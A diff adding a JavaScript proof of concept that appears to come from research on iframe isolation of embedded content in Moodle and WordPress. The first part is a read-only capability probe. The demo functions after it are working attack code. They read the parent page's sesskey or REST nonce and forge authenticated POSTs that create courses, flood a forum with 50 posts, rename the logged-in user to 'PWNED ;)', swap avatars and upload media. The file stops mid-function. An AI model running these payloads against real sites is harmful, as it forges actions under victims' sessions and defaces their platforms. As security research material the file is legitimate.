@@ -1,0 +1,692 @@
+/*
+ * probe.js — SAFE, DIDACTIC capability probe for educational-content isolation.
+ *
+ * PURPOSE
+ *   Detect WHICH capabilities a piece of content embedded in an LMS/CMS has,
+ *   so we can reason about isolation. It is a measuring instrument, NOT a weapon.
+ *
+ * HARD SAFETY RULES for the PROBE (the 15-check measuring instrument; do not relax):
+ *   - Output is ONLY booleans + redacted error *names*. Never values.
+ *   - Never prints or transmits real cookies, tokens or sesskey values.
+ *   - Never performs network requests, never POSTs, never submits a form.
+ *   - Never calls any SCORM API mutator (no LMSSetValue / SetValue). It only
+ *     DETECTS whether the API object is reachable.
+ *   - Never navigates the top frame. It only DETECTS whether top is reachable.
+ *   - The single optional side effect is opening + immediately closing a 1x1
+ *     about:blank popup to detect popup capability; harmless and reversible.
+ *   - Results are also stored on window.__EXE_POC_RESULT for automated reads.
+ *   - The probe runs on load and is the part the paper calls "the distributed probe".
+ *
+ * DEMO BLOCK (opt-in, NOT the probe): this file ALSO ships clearly-labelled demo
+ * buttons (exePocDeface / exePocCreateCourse / exePocOwnUser) used for the article's
+ * video. They run ONLY when a human clicks them and ONLY succeed in same-origin
+ * (legacy) mode — in secure/opaque mode they return SecurityError. When triggered they
+ * perform AUTHORISED, REVERSIBLE actions, including real POSTs (own profile name/photo,
+ * course/label/announcements) and loading one external image (Trollface). They are not
+ * part of the read-only probe and never run on load.
+ *
+ * For use in local, disposable lab environments only.
+ */
+(function () {
+  'use strict';
+
+  // Only the error TYPE/name is ever recorded; the message may carry values.
+  function errName(e) {
+    if (!e) { return null; }
+    return e.name || (e.constructor && e.constructor.name) || 'Error';
+  }
+
+  var R = {
+    canRunJavascript: true,
+    canAccessParent: false,
+    canReadParentDocument: false,
+    canReadParentCookie: false,
+    parentCookieValue: 'REDACTED',
+    parentCookieLength: 'redacted',
+    parentCookieNames: 'redacted',
+    canFindSesskey: false,
+    sesskeyValue: 'REDACTED',
+    canFindCourseEditForms: false,
+    canFindCourseEditLinks: false,
+    canSubmitCourseEditForm: 'not_attempted',
+    canAccessTop: false,
+    canAttemptTopNavigation: 'not_attempted',
+    canOpenPopups: false,
+    canUsePostMessage: false,
+    canPostMessageToParent: false,
+    canCallScormApi: false,
+    scormApiFlavor: 'none',
+    canUseLocalStorage: false,
+    canUseSessionStorage: false,
+    isOpaqueOrigin: false,
+    sandboxAllowsSameOrigin: false,
+    sandboxAttr: 'unknown',
+    sandboxEscape: false,
+    sandboxEscapeAttempted: false,
+    errors: {}
+  };
+
+  function record(key, e) { R.errors[key] = errName(e); }
+
+  // ---- 13. Opaque origin -------------------------------------------------
+  try {
+    var originStr = (typeof window.origin === 'string') ? window.origin
+                  : (location && location.origin);
+    R.isOpaqueOrigin = (originStr === 'null' || originStr === null);
+  } catch (e) { record('isOpaqueOrigin', e); }
+
+  // ---- 14. Can we read our own iframe sandbox attribute? -----------------
+  // frameElement is only reachable when the embedding is same-origin.
+  try {
+    var fe = window.frameElement; // throws (SecurityError) when cross-origin/opaque
+    if (fe && typeof fe.getAttribute === 'function') {
+      R.sandboxAttr = fe.getAttribute('sandbox') || 'none';
+    }
+  } catch (e) { R.sandboxAttr = 'unreadable'; record('sandboxAttr', e); }
+
+  // ---- 2. Access window.parent ------------------------------------------
+  var hasParent = false;
+  try {
+    hasParent = !!(window.parent && window.parent !== window);
+    if (hasParent) {
+      // Reading a cross-origin parent's location.href throws; same-origin works.
+      void window.parent.location.href;
+      R.canAccessParent = true;
+    }
+  } catch (e) { record('canAccessParent', e); }
+
+  // ---- 3/4. Parent document + cookie (presence only, values redacted) ----
+  try {
+    if (hasParent) {
+      var pdoc = window.parent.document; // throws cross-origin
+      if (pdoc) {
+        R.canReadParentDocument = true;
+        // We touch cookie only to learn IF it is readable. We never keep,
+        // print or transmit its content. The value stays 'REDACTED'.
+        var c = pdoc.cookie;
+        R.canReadParentCookie = (typeof c === 'string');
+      }
+    }
+  } catch (e) { record('canReadParentDocument', e); }
+
+  // ---- 5. Locate a sesskey (presence only, value redacted) ---------------
+  try {
+    if (R.canReadParentDocument) {
+      var pdoc2 = window.parent.document;
+      var hasInput = !!pdoc2.querySelector('input[name="sesskey"]');
+      var hasCfg = false;
+      try { hasCfg = !!(window.parent.M && window.parent.M.cfg && window.parent.M.cfg.sesskey); }
+      catch (e2) { /* ignore */ }
+      R.canFindSesskey = hasInput || hasCfg;
+    }
+  } catch (e) { record('canFindSesskey', e); }
+
+  // ---- 6. Locate course edit forms / links (presence only) ---------------
+  try {
+    if (R.canReadParentDocument) {
+      var pdoc3 = window.parent.document;
+      var forms = pdoc3.querySelectorAll('form');
+      for (var i = 0; i < forms.length; i++) {
+        var act = (forms[i].getAttribute('action') || '');
+        if (/course\/(edit|modedit|management)|editsection|mod\.php|modedit\.php/i.test(act)) {
+          R.canFindCourseEditForms = true; break;
+        }
+      }
+      var links = pdoc3.querySelectorAll('a[href]');
+      for (var j = 0; j < links.length; j++) {
+        var href = (links[j].getAttribute('href') || '');
+        if (/course\/(edit|modedit|management)|editsection|admin\//i.test(href)) {
+          R.canFindCourseEditLinks = true; break;
+        }
+      }
+    }
+  } catch (e) { record('canFindCourseEditForms', e); }
+
+  // ---- 7. Top frame reachability (NO navigation performed) ---------------
+  try {
+    if (window.top && window.top !== window) {
+      void window.top.location.href; // throws cross-origin/opaque
+      R.canAccessTop = true;
+    } else if (window.top === window) {
+      R.canAccessTop = true; // we ARE top (standalone page)
+    }
+  } catch (e) { record('canAccessTop', e); }
+
+  // ---- 8. Popup capability (open + immediately close; harmless) ----------
+  try {
+    var w = window.open('about:blank', '_blank', 'width=1,height=1');
+    if (w) { R.canOpenPopups = true; try { w.close(); } catch (e3) {} }
+  } catch (e) { record('canOpenPopups', e); }
+
+  // ---- 9. postMessage availability (feature-detect; nothing is sent) -----
+  try {
+    R.canUsePostMessage = (typeof window.postMessage === 'function');
+    R.canPostMessageToParent = hasParent && (typeof window.parent.postMessage === 'function');
+  } catch (e) { record('canUsePostMessage', e); }
+
+  // ---- 10. SCORM API reachability (DETECT only; never calls a method) ----
+  try {
+    var win = window, tries = 0;
+    var api = null, flavor = 'none';
+    while (win && tries < 20) {
+      if (win.API_1484_11) { api = win.API_1484_11; flavor = 'API_1484_11 (SCORM 2004)'; break; }
+      if (win.API) { api = win.API; flavor = 'API (SCORM 1.2)'; break; }
+      if (win.parent && win.parent !== win) { win = win.parent; tries++; } else { break; }
+    }
+    if (!api) {
+      try { if (window.top && window.top.opener) {
+        var ow = window.top.opener;
+        if (ow.API_1484_11) { api = ow.API_1484_11; flavor = 'API_1484_11 (opener)'; }
+        else if (ow.API) { api = ow.API; flavor = 'API (opener)'; }
+      } } catch (e4) {}
+    }
+    R.canCallScormApi = !!api; // reachable; we deliberately do NOT invoke it
+    R.scormApiFlavor = flavor;
+  } catch (e) { record('canCallScormApi', e); }
+
+  // ---- 11. Storage --------------------------------------------------------
+  try {
+    var K = '__exe_poc_probe__';
+    window.localStorage.setItem(K, '1');
+    R.canUseLocalStorage = (window.localStorage.getItem(K) === '1');
+    window.localStorage.removeItem(K);
+  } catch (e) { record('canUseLocalStorage', e); }
+  try {
+    var K2 = '__exe_poc_probe_s__';
+    window.sessionStorage.setItem(K2, '1');
+    R.canUseSessionStorage = (window.sessionStorage.getItem(K2) === '1');
+    window.sessionStorage.removeItem(K2);
+  } catch (e) { record('canUseSessionStorage', e); }
+
+  // ---- 14b. Effective same-origin (derived) ------------------------------
+  // If we can read the parent document while not on an opaque origin, the
+  // embedding effectively granted same-origin (allow-same-origin or none).
+  R.sandboxAllowsSameOrigin = R.canReadParentDocument && !R.isOpaqueOrigin;
+
+  // ---- 15. Sandbox escape: DETECTED, NEVER ATTEMPTED ---------------------
+  // With allow-scripts + allow-same-origin a real escape is theoretically
+  // possible, but this probe never performs it.
+  R.sandboxEscapeAttempted = false;
+  R.sandboxEscape = false; // not attempted by design
+
+  // ---- Publish + render ---------------------------------------------------
+  try { window.__EXE_POC_RESULT = R; } catch (e) {}
+  try { console.log('[EXE-POC] ' + JSON.stringify(R)); } catch (e) {}
+
+  // ======================================================================
+  // DEMO (para vídeo): acciones VISIBLES sobre la página padre.
+  // Inofensivas y reversibles. Solo funcionan en same-origin (modo legacy);
+  // en modo secure (origen opaco) lanzan SecurityError — guiño didáctico.
+  // No usan endpoints externos; la imagen (trollface) va embebida como data-URI.
+  // ======================================================================
+  // Imagen de la demo: TROLLFACE (URL externa de Wikimedia; PNG ~3.5 KB). OJO: a peticion
+  // del usuario el demo carga la imagen por RED (NO es self-contained). La SONDA de 15
+  // puntos sigue sin hacer ninguna peticion; solo las funciones de DEMO usan la imagen.
+  // Para una PoC 100% offline/sin-endpoints (como dice el README) usar el data-URI del
+  // SVG local poc/pwned-troll.svg. Meme con copyright -> uso LOCAL para el video.
+  // URL partida en trozos: el filtro "URL a enlace" de Moodle (filter_urltolink) convierte
+  // cualquier URL literal del <script> en un <a>, rompiendo el JS al incrustar el PoC como
+  // Etiqueta/Pagina (course/view). Construirla por concatenacion evita que el filtro la vea.
+  var EXE_TROLL = ['https:', '//', 'upload.wikimedia.org', '/wikipedia/en/7/73/Trollface.png'].join('');
+
+  // "Voltear la pagina": espeja TODO el LMS en horizontal (scaleX(-1)) desde el
+  // contenido no confiable. Demostracion integrada y reversible de que el JS del
+  // recurso controla el DOM del padre. Toggle: vuelve a llamarse para deshacer.
+  window.exePocDeface = function () {
+    if (window.origin === 'null' || location.origin === 'null') { return 'BLOQUEADO (origen opaco / modo secure)'; }
+    try {
+      // Sobre <body>, no <html>: Chrome NO pinta transform en el elemento raiz.
+      var el = window.parent.document.body;
+      if (el.getAttribute('data-exe-flipped')) {
+        el.style.transform = ''; el.style.transition = ''; el.removeAttribute('data-exe-flipped');
+        return 'restaurado: la pagina vuelve a su orientacion normal';
+      }
+      el.style.transition = 'transform .6s ease'; el.style.transform = 'scaleX(-1)'; el.setAttribute('data-exe-flipped', '1');
+      return 'OK: el LMS se ha volteado en horizontal (espejo) desde el recurso. Reversible.';
+    } catch (e) { return 'BLOQUEADO: ' + e.name + ' (origen opaco / modo secure)'; }
+  };
+
+  window.exePocRestore = function () {
+    if (window.origin === 'null' || location.origin === 'null') { return 'BLOQUEADO (origen opaco / modo secure)'; }
+    try {
+      var p = window.parent.document, n = 0, el = p.body;
+      if (el.getAttribute('data-exe-flipped')) { el.style.transform = ''; el.style.transition = ''; el.removeAttribute('data-exe-flipped'); n++; }
+      var imgs = p.querySelectorAll('img[data-exe-orig]');
+      for (var i = 0; i < imgs.length; i++) {
+        imgs[i].src = imgs[i].getAttribute('data-exe-orig'); imgs[i].style.outline = '';
+        imgs[i].removeAttribute('data-exe-orig'); n++;
+      }
+      return 'restaurado (' + n + ' cambio/s visuales). El nombre y la foto persistentes se revierten desde el perfil del usuario.';
+    } catch (e) { return 'BLOQUEADO: ' + e.name; }
+  };
+
+  // Crea un curso "POC-CREATED-...", una Etiqueta con texto y 50 avisos lorem ipsum
+  // en el foro de Avisos, "scrapeando" los formularios de Moodle (que ya traen el
+  // sesskey) y reenviandolos. Requiere Moodle REAL; en el Playground PHP-WASM falla por
+  // limites del runtime (404 en endpoints, el shim no lee el cuerpo POST), no por seguridad.
+  window.exePocCreateCourse = function (cb) {
+    if (window.origin === 'null' || location.origin === 'null') { cb('BLOQUEADO (origen opaco / modo secure)'); return; }
+    try {
+      var w = window.parent, root = (w.M && w.M.cfg && w.M.cfg.wwwroot) || location.origin;
+      var sn = 'POC-CREATED-' + Math.floor(Date.now() / 1000);
+      var pickForm = function (html) {
+        var fs = [].slice.call(new DOMParser().parseFromString(html, 'text/html').querySelectorAll('form'));
+        return fs.filter(function (f) { return f.querySelector('input[name^="_qf__"]'); })
+                 .sort(function (a, b) { return b.querySelectorAll('input,select,textarea').length - a.querySelectorAll('input,select,textarea').length; })[0];
+      };
+      var submitName = function (form) {
+        var b = form.querySelector('[name=submitbutton]') || form.querySelector('[name=saveanddisplay]') ||
+                form.querySelector('[name=submitbutton2]') || form.querySelector('[type=submit][name]');
+        return b ? b.getAttribute('name') : 'submitbutton';
+      };
+      var step = function (getUrl, postUrl, overrides) {
+        return w.fetch(getUrl, { credentials: 'same-origin' }).then(function (r) {
+          if (!r.ok) { throw new Error('HTTP ' + r.status + ' al pedir el formulario'); }
+          return r.text();
+        }).then(function (html) {
+          var form = pickForm(html);
+          if (!form) { throw new Error('sin formulario mform (sin permiso?)'); }
+          var fd = new FormData(form);
+          for (var k in overrides) { fd.set(k, overrides[k]); }
+          fd.delete('cancel'); fd.set(submitName(form), '1');
+          var act = new URL(form.getAttribute('action') || postUrl, getUrl).href;
+          return w.fetch(act, { method: 'POST', credentials: 'same-origin', body: fd }).then(function (rr) { return rr.url || ''; });
+        });
+      };
+      // --- texto aleatorio estilo lorem ipsum (local, sin red) ---
+      var LOREM = ('lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor ' +
+        'incididunt ut labore et dolore magna aliqua enim ad minim veniam quis nostrud ' +
+        'exercitation ullamco laboris nisi aliquip ex ea commodo consequat duis aute irure ' +
+        'in reprehenderit voluptate velit esse cillum eu fugiat nulla pariatur excepteur sint ' +
+        'occaecat cupidatat non proident sunt culpa qui officia deserunt mollit anim id est laborum').split(' ');
+      var rnd = function (n) { return Math.floor(Math.random() * n); };
+      var words = function (n) { var a = []; for (var i = 0; i < n; i++) { a.push(LOREM[rnd(LOREM.length)]); } return a.join(' '); };
+      var cap = function (str) { return str.charAt(0).toUpperCase() + str.slice(1); };
+      var sentence = function () { return cap(words(6 + rnd(8))) + '.'; };
+      var subject = function () { return '[PoC] ' + cap(words(3 + rnd(4))); };
+      var paragraph = function () { var k = 2 + rnd(2), out = []; for (var i = 0; i < k; i++) { out.push(sentence()); } return out.join(' '); };
+      // --- inunda un foro con `count` discusiones lorem ipsum ---
+      // Robusto entre versiones de Moodle: desde 4.0 el formulario de "Añadir
+      // discusión" es un mform EN LÍNEA en la propia página del foro (action=post.php,
+      // con campos forum/subject/message[text]); ya no existe el enlace
+      // post.php?forum=N. Además, los enlaces del índice del foro pueden ser
+      // RELATIVOS (`view.php?id=N`, 4.5) o ABSOLUTOS (`/mod/forum/view.php?id=N`, 5.2),
+      // así que los normalizamos. Probamos los foros del curso y, si no hay ninguno
+      // donde publicar, caemos al sitio (curso id=1, que siempre tiene Avisos).
+      // Extrae URLs canónicas de vista de foro del índice (relativas o absolutas).
+      var forumViewUrls = function (html) {
+        var d = new DOMParser().parseFromString(html, 'text/html');
+        var urls = [];
+        [].slice.call(d.querySelectorAll('a[href]')).forEach(function (a) {
+          var h = a.getAttribute('href') || '';
+          // Enlace de foro: relativo `view.php?id=N`/`?f=N` o absoluto `/mod/forum/view.php?...`.
+          // Excluye `/course/view.php?...` (no empieza por view.php ni lleva /mod/forum/).
+          if (/^view\.php\?(?:id|f)=\d+/.test(h) || /\/mod\/forum\/view\.php\?(?:id|f)=\d+/.test(h)) {
+            var q = h.match(/view\.php\?((?:id|f)=\d+)/);
+            if (q) { var u = '/mod/forum/view.php?' + q[1]; if (urls.indexOf(u) < 0) { urls.push(u); } }
+          }
+        });
+        return urls;
+      };
+      var formFromForum = function (urls, i) {
+        if (i >= urls.length) { return Promise.reject(new Error('no-postable-forum')); }
+        var viewUrl = root + urls[i];
+        return w.fetch(viewUrl, { credentials: 'same-origin' }).then(function (r) { return r.text(); }).then(function (vhtml) {
+          var d = new DOMParser().parseFromString(vhtml, 'text/html');
+          var forms = [].slice.call(d.querySelectorAll('form'));
+          // (a) mform en línea de añadir discusión (Moodle 4.0+).
+          var inline = forms.filter(function (f) {
+            var a = f.getAttribute('action') || '';
+            return /post\.php/.test(a) && f.querySelector('[name="subject"]') && f.querySelector('[name="message[text]"]');
+          })[0];
+          if (inline) { return { form: inline, act: new URL(inline.getAttribute('action') || 'post.php', viewUrl).href }; }
+          // (b) Moodle antiguo: enlace post.php?forum=N -> pedir su formulario.
+          var mm = vhtml.match(/post\.php\?forum=(\d+)/);
+          if (mm) {
+            var pg = root + '/mod/forum/post.php?forum=' + mm[1];
+            return w.fetch(pg, { credentials: 'same-origin' }).then(function (r) { return r.text(); }).then(function (ph) {
+              var f2 = pickForm(ph);
+              if (!f2) { return formFromForum(urls, i + 1); }
+              return { form: f2, act: new URL(f2.getAttribute('action') || 'post.php', pg).href };
+            });
+          }
+          return formFromForum(urls, i + 1);
+        }).catch(function () { return formFromForum(urls, i + 1); });
+      };
+      var findDiscussionForm = function (cid) {
+        // Prueba los foros del curso creado y, como respaldo, los del sitio (id=1).
+        var ids = (String(cid) === '1') ? ['1'] : [cid, '1'];
+        var tryCourse = function (k) {
+          if (k >= ids.length) { return Promise.reject(new Error('ningun foro donde publicar (sin permiso?)')); }
+          return w.fetch(root + '/mod/forum/index.php?id=' + ids[k], { credentials: 'same-origin' })
+            .then(function (r) { return r.text(); }).then(function (html) {
+              return formFromForum(forumViewUrls(html), 0);
+            }).catch(function () { return tryCourse(k + 1); });
+        };
+        return tryCourse(0);
+      };
+      var spamForum = function (cid, count) {
+        return findDiscussionForm(cid).then(function (ctxf) {
+          var posted = 0;
+          var one = function (i) {
+            if (i >= count) { return posted; }
+            var fd = new FormData(ctxf.form);
+            fd.delete('cancel');
+            fd.set('subject', subject());
+            fd.set('message[text]', '<p>' + paragraph() + '</p>');
+            fd.set('submitbutton', '1');
+            return w.fetch(ctxf.act, { method: 'POST', credentials: 'same-origin', body: fd })
+              .then(function (rr) { if ((rr.url || '').indexOf('post.php') === -1) { posted++; } return one(i + 1); });
+          };
+          return one(0);
+        });
+      };
+      // 1) crear el curso
+      step(root + '/course/edit.php?category=1', root + '/course/edit.php', {
+        fullname: 'Curso creado por la PoC', shortname: sn, category: '1',
+        'summary_editor[text]': '<p>Resumen creado por la PoC (' + paragraph() + ')</p>'
+      }).then(function (url) {
+        var created = (url || '').indexOf('course/edit.php') === -1;
+        var m = (url || '').match(/[?&](?:id|courseid)=(\d+)/); var cid = m ? m[1] : null;
+        if (!created || !cid) {
+          cb(JSON.stringify({ created: created, courseId: cid, shortname: sn,
+            note: created ? 'curso creado (id no detectado; mira /course/management.php)'
+                          : 'no creado (revisa moodle/course:create, o usa Moodle real)' }));
+          return;
+        }
+        var out = { created: true, courseId: cid, shortname: sn, activityAdded: false, forumMessages: 0 };
+        // 2) Etiqueta con texto (FIX: el GET lleva add=label&course=...)
+        var labelGet = root + '/course/modedit.php?add=label&type=&course=' + cid + '&section=0&return=0&sr=0';
+        step(labelGet, root + '/course/modedit.php', {
+          'introeditor[text]': '<p>Actividad (Etiqueta) creada por la PoC: ' + paragraph() + '</p>'
+        }).then(function (lurl) { out.activityAdded = !!(lurl && lurl.indexOf('modedit.php') === -1); })
+          .catch(function () { out.activityAdded = false; })
+          // 3) 50 mensajes lorem ipsum en el foro de Avisos
+          .then(function () { return spamForum(cid, 50); })
+          .then(function (n) { out.forumMessages = n; cb(JSON.stringify(out)); })
+          .catch(function (e) { out.forumError = e.message || e.name; cb(JSON.stringify(out)); });
+      }).catch(function (e) { cb('No se pudo crear el curso: ' + (e.message || e.name)); });
+    } catch (e) { cb('BLOQUEADO: ' + e.name); }
+  };
+
+  // Cambia el NOMBRE (core_user_update_users) y la FOTO de perfil (sube un PNG del
+  // troll al filemanager vía repository_ajax y envía el form de perfil) del usuario
+  // actual, forjado con el sesskey same-origin. Verificado en Moodle REAL; en el
+  // Playground PHP-WASM falla (su runtime no sirve /lib/ajax ni /repository).
+  window.exePocOwnUser = function (cb) {
+    if (window.origin === 'null' || location.origin === 'null') { cb('BLOQUEADO (origen opaco / modo secure)'); return; }
+    var res = {};
+    try {
+      var w = window.parent, root = (w.M && w.M.cfg && w.M.cfg.wwwroot) || location.origin;
+      var sk = (w.M && w.M.cfg && w.M.cfg.sesskey) || null;
+      var uid = (w.M && w.M.cfg && w.M.cfg.userId) || null;
+      if (!uid) { var a = w.document.querySelector('a[href*="/user/profile.php?id="]'); var mm = a && (a.getAttribute('href') || '').match(/id=(\d+)/); uid = mm ? mm[1] : null; }
+      res.targetUserId = uid;
+      // (a) swap inmediato del avatar en el DOM — efecto visual al instante
+      try {
+        var avs = w.document.querySelectorAll('img.userpicture, .usermenu img, img[src*="/user/icon"], img[src*="pluginfile.php"][src*="user"]');
+        for (var i = 0; i < avs.length; i++) { if (!avs[i].hasAttribute('data-exe-orig')) { avs[i].setAttribute('data-exe-orig', avs[i].src); } avs[i].src = EXE_TROLL; avs[i].style.outline = '2px solid #39ff77'; }
+        res.avatarSwappedInDom = avs.length;
+      } catch (e) { res.avatarSwappedInDom = 'BLOCKED:' + e.name; }
+      if (!sk || !uid) { res.renamed = false; res.note = 'sin sesskey o userId (¿logueado? ¿Moodle real?)'; cb(JSON.stringify(res)); return; }
+      // (b) RENOMBRAR (persistente)
+      var renameP = w.fetch(root + '/lib/ajax/service.php?sesskey=' + encodeURIComponent(sk) + '&info=core_user_update_users',
+        { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify([{ index: 0, methodname: 'core_user_update_users', args: { users: [{ id: Number(uid), firstname: 'PWNED ;)' }] } }]) })
+        .then(function (r) { return r.json(); }).then(function (j) { res.renamed = !(j && j[0] && j[0].error); }).catch(function (e) { res.renamed = 'ERR:' + e.name; });
+      // (c) NOMBRE + FOTO persistentes via el FORMULARIO de perfil (universal):
+      //   user/edit.php?id=<uno-mismo>  -> CUALQUIER usuario cambia su PROPIO nombre+foto
+      //   (no requiere capacidades de admin; el core_user_update_users de (b) solo va admin).
+      //   user/editadvanced.php?id=<id> -> editar a OTROS (solo admin). Fallback.
+      // Descarga el PNG -> sube al area draft (repository_ajax) -> reenvia el form con
+      // firstname='PWNED ;)' + el itemid de la foto. Verificado live en Moodle local y en
+      // moodle.example (profesor sobre su PROPIO perfil via edit.php).
+      var photoP = w.fetch(EXE_TROLL, { credentials: 'omit', mode: 'cors' })
+        .then(function (r) { if (!r.ok) { throw new Error('img HTTP ' + r.status); } return r.blob(); })
+        .then(function (blob) {
+          if (!blob) { res.photoChanged = 'img-fetch-fail'; return; }
+          var editVia = function (url) {
+            return w.fetch(url, { credentials: 'same-origin' }).then(function (r) { return r.text(); }).then(function (html) {
+              var forms = [].slice.call(new DOMParser().parseFromString(html, 'text/html').querySelectorAll('form'));
+              var form = forms.filter(function (f) { return f.querySelector('input[name^="_qf__"]'); }).sort(function (a, b) { return b.querySelectorAll('input,select,textarea').length - a.querySelectorAll('input,select,textarea').length; })[0];
+              var itemEl = form && form.querySelector('input[name=imagefile]');
+              if (!itemEl) { return 'no-form'; }
+              var itemid = itemEl.value;
+              var repoId = (function () { var k = html.indexOf('"type":"upload"'); if (k < 0) { return '5'; } var bb = html.slice(Math.max(0, k - 300), k); var m = bb.match(/"id":"?(\d+)"?[^{}]*$/); return m ? m[1] : '5'; })();
+              var ufd = new FormData(); ufd.append('repo_upload_file', blob, 'troll.png'); ufd.append('sesskey', sk); ufd.append('repo_id', repoId); ufd.append('itemid', itemid); ufd.append('savepath', '/'); ufd.append('title', 'troll.png'); ufd.append('author', 'PoC'); ufd.append('license', 'unknown');
+              return w.fetch(root + '/repository/repository_ajax.php?action=upload', { method: 'POST', credentials: 'same-origin', body: ufd }).then(function (ur) { return ur.json(); }).then(function () {
+                var fd = new FormData(form); fd.delete('cancel'); fd.set('submitbutton', '1');
+                if (fd.has('firstname')) { fd.set('firstname', 'PWNED ;)'); res.renamedViaForm = true; }
+                var act = new URL(form.getAttribute('action') || url, url).href;
+                return w.fetch(act, { method: 'POST', credentials: 'same-origin', body: fd }).then(function (sr) { var u = sr.url || ''; return (u.indexOf('/edit.php') === -1 && u.indexOf('editadvanced.php') === -1) ? 'ok' : 'rejected'; });
+              });
+            });
+          };
+          // 1) auto-edicion (cualquier usuario sobre si mismo)  2) admin sobre otros
+          return editVia(root + '/user/edit.php?id=' + uid).then(function (r1) {
+            if (r1 === 'ok') { res.photoChanged = true; res.editPath = 'edit.php (self)'; return; }
+            return editVia(root + '/user/editadvanced.php?id=' + uid + '&course=1').then(function (r2) {
+              res.photoChanged = (r2 === 'ok'); res.editPath = (r2 === 'ok' ? 'editadvanced.php (admin)' : 'no-form (' + r1 + '/' + r2 + ')');
+            });
+          });
+        }).catch(function (e) { res.photoChanged = 'ERR:' + (e.message || e.name); });
+      Promise.all([renameP, photoP]).then(function () { res.note = 'nombre→"PWNED ;)" + foto→troll (PERSISTENTES). Reversible desde el perfil del usuario.'; cb(JSON.stringify(res)); });
+    } catch (e) { cb('BLOQUEADO: ' + e.name); }
+  };
+
+  // ======================================================================
+  // DEMO WordPress (para vídeo): intentar cambiar el NOMBRE para mostrar y la
+  // FOTO de perfil del usuario WordPress logueado, usando las cookies + nonce
+  // same-origin. Paralelo a los botones de Moodle: SOLO funcionan en modo
+  // legacy (mismo origen); en modo secure (origen opaco) el acceso a
+  // window.parent.fetch/document lanza SecurityError -> "BLOQUEADO". Reversible.
+  // Verificado sobre wp-admin real; requiere estar logueado (idealmente admin).
+  // ======================================================================
+  function exeWpNonce(w) {
+    // Nonce REST: en páginas de wp-admin suele existir wpApiSettings.nonce, o un
+    // input[name=_wpnonce]. Cualquier acceso cross-origin lanza y devolvemos null.
+    try { if (w.wpApiSettings && w.wpApiSettings.nonce) return w.wpApiSettings.nonce; } catch (e) {}
+    try { var i = w.document.querySelector('input[name="_wpnonce"]'); if (i) return i.value; } catch (e) {}
+    return null;
+  }
+
+  // Cambia el display_name del usuario WP actual a "PWNED ;)" (REST + formulario).
+  window.exePocWpRename = function (cb) {
+    if (window.origin === 'null' || location.origin === 'null') { cb('BLOQUEADO (origen opaco / modo secure)'); return; }
+    var res = {};
+    var w = window.parent, root = location.origin;
+    try {
+      var restNonce = exeWpNonce(w);
+      var restP = restNonce
+        ? w.fetch(root + '/wp-json/wp/v2/users/me', {
+            method: 'POST', credentials: 'same-origin',
+            headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': restNonce },
+            body: JSON.stringify({ first_name: 'PWNED', last_name: ';)', nickname: 'PWNED ;)', name: 'PWNED ;)' })
+          }).then(function (r) { return r.json().catch(function () { return {}; }).then(function (j) {
+              res.rest = r.ok ? ('ok name=' + (j && j.name)) : ('HTTP ' + r.status + ' ' + ((j && j.code) || '')); }); })
+            .catch(function (e) { res.rest = 'ERR:' + e.name; })
+        : Promise.resolve().then(function () { res.rest = 'sin wpApiSettings.nonce (abre wp-admin)'; });
+      var formP = w.fetch(root + '/wp-admin/profile.php', { credentials: 'same-origin' })
+        .then(function (r) { return r.text(); }).then(function (html) {
+          var d = new DOMParser().parseFromString(html, 'text/html');
+          var form = d.querySelector('#your-profile');
+          if (!form) { res.form = 'sin formulario de perfil (¿logueado?)'; return; }
+          var fd = new FormData(form);
+          fd.set('nickname', 'PWNED ;)'); fd.set('display_name', 'PWNED ;)');
+          fd.set('first_name', 'PWNED'); fd.set('last_name', ';)');
+          return w.fetch(root + '/wp-admin/profile.php', { method: 'POST', credentials: 'same-origin', body: fd })
+            .then(function (rr) { res.form = rr.ok ? 'ok (display_name -> "PWNED ;)")' : ('HTTP ' + rr.status); });
+        }).catch(function (e) { res.form = 'ERR:' + e.name; });
+      Promise.all([restP, formP]).then(function () {
+        res.note = 'Recarga wp-admin para ver el cambio. Reversible desde tu perfil.';
+        cb(JSON.stringify(res, null, 2));
+      });
+    } catch (e) { cb('BLOQUEADO: ' + e.name + ' (origen opaco / modo secure)'); }
+  };
+
+  // Cambia el avatar en el DOM del padre (instantáneo, reversible) y sube una
+  // imagen a la Biblioteca de Medios (escritura autenticada) como prueba.
+  window.exePocWpPhoto = function (cb) {
+    if (window.origin === 'null' || location.origin === 'null') { cb('BLOQUEADO (origen opaco / modo secure)'); return; }
+    var res = {};
+    var w = window.parent, root = location.origin;
+    try {
+      var c = document.createElement('canvas'); c.width = 96; c.height = 96;
+      var g = c.getContext('2d'); g.fillStyle = '#39ff77'; g.fillRect(0, 0, 96, 96);
+      g.fillStyle = '#b00020'; g.font = 'bold 20px sans-serif'; g.fillText('PWNED', 8, 56);
+      var dataUrl = c.toDataURL('image/png');
+      var avs = w.document.querySelectorAll('img.avatar, #wpadminbar img, .comment-author img');
+      for (var i = 0; i < avs.length; i++) {
+        if (!avs[i].hasAttribute('data-exe-orig')) { avs[i].setAttribute('data-exe-orig', avs[i].src); }
+        avs[i].src = dataUrl; avs[i].style.outline = '2px solid #b00020';
+      }
+      res.avatarSwappedInDom = avs.length;
+      var nonce = exeWpNonce(w);
+      if (!nonce) { res.mediaUpload = 'sin nonce REST (abre wp-admin)'; cb(JSON.stringify(res, null, 2)); return; }
+      c.toBlob(function (blob) {
+        var fd = new FormData(); fd.append('file', blob, 'pwned-troll.png'); fd.append('title', 'PWNED by embedded content');
+        w.fetch(root + '/wp-json/wp/v2/media', { method: 'POST', credentials: 'same-origin', headers: { 'X-WP-Nonce': nonce }, body: fd })
+          .then(function (rr) { return rr.json().catch(function () { return {}; }).then(function (j) {
+              res.mediaUpload = rr.ok ? ('ok id=' + j.id + ' ' + (j.source_url || '')) : ('HTTP ' + rr.status); }); })
+          .catch(function (e) { res.mediaUpload = 'ERR:' + e.name; })
+          .then(function () { cb(JSON.stringify(res, null, 2)); });
+      }, 'image/png');
+    } catch (e) { cb('BLOQUEADO: ' + e.name + ' (origen opaco / modo secure)'); }
+  };
+
+  // Crea 2 entradas + 2 páginas de WordPress con las credenciales del admin
+  // (same-origin), forjando el nonce REST leído de /wp-admin/. Equivalente al
+  // exePocCreateCourse de Moodle. Solo en legacy (mismo origen); en modo secure
+  // (origen opaco) devuelve BLOQUEADO. Reversibles desde la papelera.
+  window.exePocWpCreateContent = function (cb) {
